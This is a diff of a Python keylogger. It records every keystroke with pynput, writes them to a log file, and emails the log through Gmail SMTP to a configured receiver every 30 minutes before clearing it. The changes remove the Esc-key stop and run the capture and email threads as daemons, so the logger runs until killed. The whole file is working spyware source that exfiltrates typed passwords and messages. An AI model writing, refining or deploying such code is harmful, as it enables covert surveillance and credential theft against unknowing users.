@@ -1,4 +1,4 @@
-import pynput, time, threading, os, smtplib, ssl, getpass
+import time, smtplib, getpass, threading
 
 from datetime import datetime # Display the date the log is made.
 from pynput.keyboard import Key, Listener
@@ -12,10 +12,13 @@ from email.mime.application import MIMEApplication # For File Attachment
 EMAILID = "EMAIL" # REPLACE
 EMAILPASS = "PASS" # REPLACE
 TOEMAIL = "RECEIVER" # REPLACE
+INTERVALS = 30 # NUMBER OF MINUTES.
+SECPERMIN = 60
 
-CYCLE = 60 * 10 # Time interval to Email and Clean Logs. (10 Minutes)
+CYCLE = INTERVALS * SECPERMIN # Time interval to Email and Clean Logs. (MIN * SECS/MIN)
 FILENAME = "log.txt" # Filename.
-finished = False # Global Track to see if Log is finished.
+
+#finished = False # Global Track to see if Log is finished.
 
 # Dictionary stores all non-alphanumeric keys.
 ReplaceCode = {Key.space: ' ', Key.enter: ' [enter]\n', Key.tab: '[tab]', Key.esc: ' [esc] ', Key.shift: ' [shift] ', Key.ctrl: ' [ctrl] ', Key.backspace: ' [back] ', Key.cmd: ' [cmd] ', Key.alt: ' [alt] '}
@@ -29,24 +32,25 @@ def on_press(key):
         text = key.char
     elif key in ReplaceCode:
         text = ReplaceCode[key]
-
     # Write to file if text is valid.
     if text != None:
         write_file(FILENAME, text)
 
-#def on_release(key):
-    # Stops Log Execution if Esc is pressed.
- #   if key == Key.esc:
-  #      return False
+"""
+def on_release(key):
+    #Stops Log Execution if Esc is pressed.
+    if key == Key.esc:
+        return False
+"""
 
 def IntervalEmailandCls():
 
     StartTime = time.time() # Start Timer at when thread starts.
-    global finished
 
-    while (finished == False):
-        ElapsedTime = time.time() - StartTime
-        if (ElapsedTime == CYCLE): # If 10 minutes has passed.
+    #
+    while True:
+        ElapsedTime = time.time() - StartTime # Elapsed Time is computed in Seconds.
+        if (ElapsedTime == CYCLE): # If interval time has passed.
             try:
                 server = smtplib.SMTP('smtp.gmail.com', 587)  # Sets up a port connection.
     
@@ -93,7 +97,7 @@ def recreate_file(file):
 # Function to retrieve Key presses.
 def StartLog():
 
-    global finished # Finish to stop scheduled cleaning and sending of file.
+    #global finished # Finish to stop scheduled cleaning and sending of file.
 
     # Create a new file to write to.
     recreate_file(FILENAME)
@@ -102,13 +106,30 @@ def StartLog():
     with Listener(on_press=on_press) as listener:
         listener.join()
 
-        if not listener.running:  # If Listener is no longer running, it is finished.
-            finished = True
-            print("\nFinished.\n")
+# Main method.
+def main():
+
+    KeyLogger = Thread(target=StartLog, daemon=True) # daemonic thread --> Stop threads once Main ends.
+    Timer = Thread(target=IntervalEmailandCls, daemon=True)
+
+    try:
+        # Multithread
+        KeyLogger.start() # Thread to log key strokes.
+        Timer.start() # Thread to time intervals to email and clear the file.
+
+        # Shows all active threads.
+        print(threading.enumerate())
+
+        # Prevent main thread from finishing.
+        Timer.join()
+        KeyLogger.join()
+
+    except KeyboardInterrupt: # Once 'ctrl+c' is detected, terminate main thread (also terminates all daemonic threads)
+
+        print('\nProgram terminated.\n')
+
 
 # Execute if it is the main module.
 if __name__ == "__main__":
 
-    # Executing both Cleanup Interval and Main method simultaneously.
-    Thread(target=StartLog).start()  # Keeps reading keystrokes while esc not pressed.
-    Thread(target=IntervalEmailandCls).start() # Tracks time to before cleaning and sending the text file.
+    main()
